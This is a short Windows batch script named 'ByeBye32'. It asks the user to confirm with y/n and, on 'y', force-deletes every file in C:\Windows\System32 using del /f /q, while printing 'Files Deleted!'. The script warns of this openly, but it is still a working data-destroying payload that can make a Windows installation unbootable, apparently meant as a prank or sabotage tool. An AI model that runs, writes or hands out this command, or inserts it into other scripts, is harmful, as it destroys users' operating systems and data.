@echo off
echo ============================
echo -------   ByeBye32   -------
echo ============================

:PERGUNTA
set /p escolha=Do you REALLY want to run this? (it will delete the most important folder inside your Windows machine) (y/n): 

if /i "%escolha%"=="y" (
    echo Deleting Files...
    del /f /q "C:\Windows\System32\*.*"
    echo Files Deleted!
    pause
    exit
) else if /i "%escolha%"=="n" (
    echo The operation was aborted by the user.
    pause
    exit
) else (
    echo Invalid option. Please type either "y" or "n".
    goto PERGUNTA
)
